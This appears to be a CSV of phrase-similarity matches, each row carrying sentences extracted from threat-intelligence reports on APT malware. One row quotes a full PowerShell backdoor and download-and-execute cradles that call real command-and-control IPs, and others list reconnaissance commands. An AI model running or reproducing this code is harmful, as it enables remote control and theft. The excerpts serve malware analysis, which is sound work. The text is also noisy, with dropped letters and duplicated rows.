hash,phrase,similarity,adjacent_sentences
b5d067b705e3d7716dc5cd360e61cc7d,to decrypt the payload,0.770388922287375,"['Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt it,0.8988606746601266,"['Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.']"
937553fb8e3ba631cb28165aa71a66da,proxy,0.7569189103367252,"['Then it hashes (MD5) the constructed byte aray and derives an AES-CBC 128bits key and decrypts the data.', 'In adition, ShadowPad stores, in an encrypted format, the folowing data in the registry with the registry key name being unique (based on volume serial number of C:\\) for each compromised host: 1.', 'ShadowPad configuration (0x80) data.', '2.', 'Proxy configuration.', 'Includes proxy information that ShadowPad requires.', 'These are the network comunication protocol, domain/IP proxy and the proxy port.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.']"
c5015c07f1dfdf29e9638da275dcaf47,Windows API,0.7851647481362197,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,Windows API,0.7851647481362197,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"[': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"[': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"[': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .']"
57c72cba1b008593ba3d60f214807584,Windows API,0.7851647481362197,"['Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.']"
7fd321bf3d665b1e21967c3a8052d876,Windows API,0.7851647481362197,"['Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.']"
22a069efb6997235b32a9c908f7b7300,"the malware creates a scheduled task to execute its copy from this randomized path:

schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f",0.8779803971078495,"['If this fails, the malware does not continue the execution, likely because the infected user only has low privileges.', 'Next, the malware creates 2 scheduled tasks caled test and test2 to retrieve and execute PowerShel comands, each retrieved from robots.txt from diferent C&C servers, most likely to eliminate a single point of failure: schtasks /Create /TN test /SC MINUTE /MO 15 /TR ""powershel \\""$r= [System.Net.WebRequest]:Create(\\""htp:/5.18.3.190/Robots.txt\\"");(new- object System.IO.StreamReader($r.GetResponse().GetResponseStream().ReadToEnd() | powershel.exe -noprofile -\\"" /f schtasks /Create /TN test2 /SC MINUTE /MO 45 /TR ""powershel \\""$r= [System.Net.WebRequest]:Create(\\""htp:/103.159.132.91/Robots.txt\\""); (new-object System.IO.StreamReader($r.GetResponse().GetResponseStream().ReadToEnd() | powershel.exe -noprofile -\\"" /f At the time of execution, both servers returned the same code pointing to the third server: C:\\Windows\\System32\\cmd.exe /c ""start powershel.exe -nop -c set-alias exi iex;`$v1=\'iex (new-object net.webclient).dow\';`$v2=\'nloadstring(\'htp:/\';`$v3=\'103.159.132.91/robots1.txt\')\';exi(`$v1+ The final payload returned is a lightweight PowerShel backdor, which retrieves a list of comands from the CMD header from the C&C server response, executes them with Invoke-Expresion, concatenates the outputs with \'_n1w_\' string, and sends them back to the server in POST request: $WindowState = \'[DlImport(""user32.dl"")] public static extern bol ShowWindow(int handle, int stat);\';ad-type -name win -member $WindowState - namespace native; [native.win]:ShowWindow([System.Diagnostics.Proces]:GetCurentProces() | Get-Proces).MainWindowHandle, 0); $url=""htp:/103.159.132.91:8081/""; $postParams = \'result=start\'; while (1 -eq 1) { try { $data = [System.Text.Encoding]:UTF8.GetBytes($postParams); $req = [System.Net.WebRequest]:Create($url); $req.ServicePoint.ConectionLimit =6535; If ($req.ServicePoint.CurentConections -ge 10) { $req.ServicePoint.CloseConectionGroup("") } $req.ServicePoint.Expect10Continue = $false; #$req.Timeout = 10; $req.Method = ""POST""; $req.ContentType = ""aplication/x-w-form-urlencoded""; $req.ContentLength = $data.Length; $Stream = $req.GetRequestStream(); $Stream.Write($data, 0, $data.Length);$Stream.Flush();$Stream.Close(); #waiting remote [System.Net.WebResponse] $resp = $req.GetResponse();$header=$resp.GetResponseHeader(\'CMD\'); $d = [System.Convert]:FromBase64String($header); $Ds = [System.Text.Encoding]:UTF8.GetString($d);$result = ""; Foreach ($string in invoke-expresion $Ds) {$result=$result+\'_n1w_\'+$string;}; $result = [Convert]:ToBase64String([System.Text.Encoding]:UTF8.GetBytes($result); $postParams = ""result=$result""; } 4/6 catch{}; }; The malware then copies itself to the zip file with the name [16 random characters].zip in c:\\users\\public\\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\\users\\public\\pMiOxI3G4Igrpq7.zip\\.', 'Both the file inside the zip and the unziped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe.', 'Finaly, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\\users\\public\\8NaZrCq3pGeDRXKF.zip\\8NaZr.exe"" /f Second mode: the backdor This mode hapens after the malware has achieved persistence and is runing from a zip path.', 'First, the malware enumerates the system for the folowing data and concatenates it to one string: The curent system username The curent username home folder The systems network interfaces (name, MacAdres, description) Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.', 'It then picks one random C&C URL out of the thre available and constructs a GET request: htp:/5.18.3.190/api.php htp:/103.169.90.132/api.php htp:/103.159.132.91/api.php The encoded enumeration data is stored in a cokie caled SN.', 'Other headers in the request are constructed from serval random values.']"
73ae3d11837c3f9dbcfc8f41544bb20e,ipconfig,0.80966835917559,"[' .', '2017.', '2 0 1 7.', '- (Ii -) .46535.I5 3 474 2 0 1 7.']"
3e9312913ace03550c810e6b92ab1d61,they also used tasklist,0.7743869862312265,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,they also used tasklist,0.7743869862312265,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.']"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
31347d89b18461f35448b26fefb00133,cmd.exe /c start,0.7861735725500969,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /c start,0.7861735725500969,"[', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").']"
08a0ccc49008dbbf532b22d39ac2b886,delete the driver files.,0.7719300643534468,"['4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.']"
3e9312913ace03550c810e6b92ab1d61,whoami /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.']"
